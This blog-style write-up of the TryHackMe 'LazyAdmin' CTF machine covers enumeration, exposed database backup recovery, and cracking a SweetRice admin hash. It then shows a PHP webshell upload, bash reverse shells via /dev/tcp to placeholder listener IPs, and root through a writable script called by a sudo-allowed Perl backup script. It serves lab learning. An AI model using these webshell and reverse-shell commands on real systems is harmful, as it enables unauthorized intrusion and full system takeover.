---
title: "Lazy Admin: From Hidden SweetRice to Root Through a Backup Script"
date: 2026-05-14 09:00:00 +0300
category: cybersecurity
subcategories:
  - ctf
  - web-security
  - privilege-escalation
tags:
  - CTF
  - TryHackMe
  - SweetRice
  - File Upload
  - Perl
  - Privilege Escalation
type: technical-breakdown
summary: "A hidden SweetRice instance, an exposed SQL backup, and a writable script in a sudo-approved backup chain turn a narrow web foothold into root."
featured: false
---

Machine: [LazyAdmin](https://tryhackme.com/room/lazyadmin)

## Introduction

Lazy Admin is a good example of a box that opens up only after the initial surface starts making sense. The root page looked unhelpful, SSH was exposed but gave me nothing to work with, and the real path only emerged once I found the application hiding behind the default Apache page.

The compromise ended up flowing through SweetRice, an exposed database backup, an authenticated upload path, and a backup script that should never have been trusted the way it was.

---

## Initial Enumeration

I started with a full port scan to get a complete view of the target before spending time anywhere specific.

```bash
nmap -sC -sV -p- -T4 target
```

The result was narrow:

```text
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp open  http  Apache httpd 2.4.18
```

At that stage, SSH did not give me much beyond version information, so HTTP was the more useful place to stay. The web root itself was just the default Apache page, which usually means one of two things: either the host is genuinely empty, or the interesting content lives somewhere else.

In this case, it was the second one.

---

## Finding the Real Application

I used directory brute-forcing against the web server:

```bash
gobuster dir -u http://target -w /usr/share/dirb/wordlists/common.txt
```

That gave me my first real lead:

```text
/content
```

From there I enumerated inside that path as well:

```bash
gobuster dir -u http://target/content -w /usr/share/dirb/wordlists/common.txt
```

Relevant results included:

```text
/content/as
/content/inc
/content/attachment
```

That was enough to show that `/content/` was not just a stray directory. It looked like an application structure, with an admin area, internal files, and an attachment path.

To fingerprint it more cleanly, I checked it with a couple of lighter probes:

```bash
whatweb http://target/content
curl http://target/content/as
```

That pointed to **SweetRice**. Once I had the CMS name, the next step was versioning.

I did not get much directly from the page, so I expanded enumeration to include likely text files:

```bash
gobuster dir -u http://target/content -w /usr/share/wordlists/dirb/big.txt -x txt,php,html
```

That exposed a changelog:

```text
/content/changelog.txt
```

Inside it was the version:

```text
SweetRice - Version 1.5.0
```

That narrowed the problem considerably. Up to that point I was still doing generic web enumeration. After that, I was working against a specific CMS version with a much smaller search space.

---

## Turning Version Information Into a Lead

My first search for a version-specific exploit was not especially helpful:

```bash
searchsploit "SweetRice 1.5.0"
```

That returned nothing useful, so I widened the search:

```bash
searchsploit SweetRice
```

The results were not a perfect match, but they were still useful. The two findings that stood out were file upload issues and backup disclosure in nearby SweetRice versions.

That was enough to start testing application paths tied to those weaknesses instead of waiting for an exact exploit match. The backup angle looked more promising first, mainly because the application structure had already exposed an `inc` directory and the disclosure issue fit that layout well.

I checked the backup location:

```bash
curl http://target/content/inc/mysql_backup
```

And that paid off immediately:

```text
Index of /content/inc/mysql_backup
mysql_bakup_20191129023059-1.5.1.sql
```

I downloaded the file:

```bash
wget http://target/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

This was the first real pivot in the box. Once the SQL dump was accessible over HTTP, the problem changed from web enumeration to mining the application's own data.

---

## Recovering the Admin Credentials

I searched the backup for user-related data:

```bash
grep -i user mysql_bakup_20191129023059-1.5.1.sql
```

Relevant output:

```text
manager
42f749ade7f9e195bf475f37a44cafcb
```

That gave me a username and an MD5 hash. From there, offline cracking was the obvious next step:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

It cracked quickly:

```text
Password123
```

Those credentials were more valuable than just another foothold. They moved the web application from something I could probe from the outside into something I could abuse as an authenticated user, which was a much more interesting position.

I logged into the SweetRice admin panel as `manager` with `Password123`.

---

## Using the Admin Panel for Code Execution

Once inside the CMS, I went looking for an upload feature. The media functionality was enough for that.

I built a minimal PHP webshell and zipped it before uploading:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php
```

The upload worked, but finding the payload afterward took a little adjustment. My first attempt was to request it directly under the original filename:

```bash
curl http://target/content/attachment/shell.php
```

That returned a 404, which suggested the file had either been renamed or stored differently by the application.

After locating the actual uploaded filename under the attachment path, I verified command execution:

```bash
curl "http://target/content/attachment/<randomized>.php?cmd=id"
```

The response confirmed code execution as the web server user:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From there I switched to a reverse shell. I did waste a little time on an early attempt that ended up executing locally rather than through the target, but once I corrected that and triggered it through the webshell properly, the callback landed as expected.

Listener:

```bash
nc -lvnp 4444
```

Trigger:

```bash
curl "http://target/content/attachment/<randomized>.php?cmd=bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'"
```

Once the shell connected back as `www-data`, I upgraded it into a usable TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
```

That made the post-exploitation phase much easier to work through.

---

## Local Enumeration and the Sudo Pivot

With a stable shell, I moved into the home directories and found an `itguy` account with a few interesting files, including:

- `backup.pl`
- `mysql_login.txt`
- `user.txt`

The user flag confirmed access, but the more important artifact was the backup script. I checked sudo permissions next:

```bash
sudo -l
```

The result was the strongest privilege escalation lead on the box:

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

That kind of entry is worth reading carefully. The interesting question was not whether I could run Perl as root in general. I could not. The rule was tightly scoped to one specific script. So the real question became whether that script handed control to something I could influence.

I opened it:

```bash
cat /home/itguy/backup.pl
```

Relevant content:

```perl
system("sh", "/etc/copy.sh");
```

That was the moment the escalation path became clear. `backup.pl` itself was not the real boundary. It was just a root-approved wrapper around another script. Once a privileged script delegates execution to a second file, the second file becomes the part that matters.

I first confirmed that I could not simply replace the allowed command with my own Perl one-liner under sudo. That failed, which was useful in its own way because it confirmed the scope of the rule. I had to work with `backup.pl`, not around it.

So I checked the target of that call chain instead and found that `/etc/copy.sh` was writable. At that point the privilege escalation stopped being a question of theory and became an execution problem.

---

## Privilege Escalation

I replaced the contents of `/etc/copy.sh` with a reverse shell payload:

```bash
echo 'bash -c "bash -i >& /dev/tcp/LISTENER_IP/5555 0>&1"' > /etc/copy.sh
```

Then I opened a second listener:

```bash
nc -lvnp 5555
```

And triggered the allowed command:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

The callback returned as root.

I verified that first and then moved into `/root` to read the final flag.

```bash
whoami
cat /root/root.txt
```

---

## Conclusion

Lazy Admin came down to chaining together a series of small trust failures:

- the real application was exposed behind a default page
- a database backup was accessible over HTTP
- the admin password was weak enough to crack quickly
- authenticated upload gave me code execution
- a sudo-approved backup script delegated execution to a writable shell script

What I liked about this machine was that none of those issues needed to be dramatic on their own. The box only really fell apart once each one was allowed to reinforce the next. That makes it a useful reminder that compromise often comes less from one major bug than from a system that keeps trusting the wrong thing at each layer.
